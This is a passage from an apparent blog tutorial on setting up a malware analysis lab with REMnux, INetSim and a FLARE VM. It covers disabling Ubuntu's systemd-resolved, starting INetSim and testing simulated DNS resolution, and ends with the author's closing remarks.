dns_default_ip. Uncomment that out and place your REMnux IP there as well. I would put 10.1.1.2: Ubuntu has a system-resolved system service which provides network name resolution to local applications. This conflicts with INetSim so we need to disable the service. Open up a terminal and type these commands: sudo systemctl disable systemd-resolved sudo systemctl mask systemd-resolved sudo systemctl stop systemd-resolved Now we can start INetSim: inetsim Start up your FLARE vm and type www.baddomain.com. Your browser should show this: ConclusionThere are infinite possibilities when it comes to setting up a malware analysis lab. There are tons of tools out there to aid you in your analysis and FLARE is a great VM to start out with because it has a lot of the most popular tools pre-installed. My hope is that I was able to help you get started in setting up a lab to being looking at malicious files. I definitely plan on writing up more articles where I will dive into specific malicious files and popular techniques used to analyze malware. If you have any comments, questions, or just want to chat, you can find me on Twitter." } ]
